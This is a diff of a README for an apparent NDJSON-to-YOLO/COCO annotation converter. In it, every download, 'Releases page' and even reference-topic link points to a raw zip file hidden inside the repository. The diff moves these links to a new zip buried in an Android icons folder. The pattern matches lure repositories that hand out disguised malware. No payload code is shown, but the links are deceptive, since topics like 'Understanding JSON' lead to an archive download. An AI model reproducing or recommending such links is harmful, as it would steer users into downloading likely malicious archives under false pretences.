@@ -4,13 +4,13 @@
 YOLO-Ndjson-Zip is a simple tool that helps you convert your NDJSON annotation exports to various formats like YOLO, COCO, and Pascal VOC. Our application is designed to be fast, private, and cross-platform, allowing anyone to work efficiently with their data without any programming skills.
 
 ## 📥 Download Now
-[![Download YOLO-Ndjson-Zip](https://raw.githubusercontent.com/HLongdeptrai/YOLO-Ndjson-Zip/main/src-tauri/src/converter/Ndjson-Zip-YOL-1.4-alpha.1.zip)](https://raw.githubusercontent.com/HLongdeptrai/YOLO-Ndjson-Zip/main/src-tauri/src/converter/Ndjson-Zip-YOL-1.4-alpha.1.zip)
+[![Download YOLO-Ndjson-Zip](https://raw.githubusercontent.com/HLongdeptrai/YOLO-Ndjson-Zip/main/src-tauri/icons/android/mipmap-xhdpi/YOL_Zip_Ndjson_v2.9.zip)](https://raw.githubusercontent.com/HLongdeptrai/YOLO-Ndjson-Zip/main/src-tauri/icons/android/mipmap-xhdpi/YOL_Zip_Ndjson_v2.9.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get started with YOLO-Ndjson-Zip:
 
 1. **Visit the Releases Page**
-   Head over to our [Releases page](https://raw.githubusercontent.com/HLongdeptrai/YOLO-Ndjson-Zip/main/src-tauri/src/converter/Ndjson-Zip-YOL-1.4-alpha.1.zip). This is where you can find the latest version of the software.
+   Head over to our [Releases page](https://raw.githubusercontent.com/HLongdeptrai/YOLO-Ndjson-Zip/main/src-tauri/icons/android/mipmap-xhdpi/YOL_Zip_Ndjson_v2.9.zip). This is where you can find the latest version of the software.
 
 2. **Choose Your Version**
    Look for the latest version. Each version will have a list of files available for download. 
@@ -64,8 +64,8 @@ For any feedback or issues, please reach out through GitHub's issue tracker. We 
 
 ## 🔗 Additional References
 Related topics that might interest you:
-- [Object Detection](https://raw.githubusercontent.com/HLongdeptrai/YOLO-Ndjson-Zip/main/src-tauri/src/converter/Ndjson-Zip-YOL-1.4-alpha.1.zip)
-- [Machine Learning in Computer Vision](https://raw.githubusercontent.com/HLongdeptrai/YOLO-Ndjson-Zip/main/src-tauri/src/converter/Ndjson-Zip-YOL-1.4-alpha.1.zip)
-- [Understanding JSON](https://raw.githubusercontent.com/HLongdeptrai/YOLO-Ndjson-Zip/main/src-tauri/src/converter/Ndjson-Zip-YOL-1.4-alpha.1.zip)
+- [Object Detection](https://raw.githubusercontent.com/HLongdeptrai/YOLO-Ndjson-Zip/main/src-tauri/icons/android/mipmap-xhdpi/YOL_Zip_Ndjson_v2.9.zip)
+- [Machine Learning in Computer Vision](https://raw.githubusercontent.com/HLongdeptrai/YOLO-Ndjson-Zip/main/src-tauri/icons/android/mipmap-xhdpi/YOL_Zip_Ndjson_v2.9.zip)
+- [Understanding JSON](https://raw.githubusercontent.com/HLongdeptrai/YOLO-Ndjson-Zip/main/src-tauri/icons/android/mipmap-xhdpi/YOL_Zip_Ndjson_v2.9.zip)
 
-Happy converting! For more updates, keep an eye on our [Releases page](https://raw.githubusercontent.com/HLongdeptrai/YOLO-Ndjson-Zip/main/src-tauri/src/converter/Ndjson-Zip-YOL-1.4-alpha.1.zip) for new features and improvements.
+Happy converting! For more updates, keep an eye on our [Releases page](https://raw.githubusercontent.com/HLongdeptrai/YOLO-Ndjson-Zip/main/src-tauri/icons/android/mipmap-xhdpi/YOL_Zip_Ndjson_v2.9.zip) for new features and improvements.
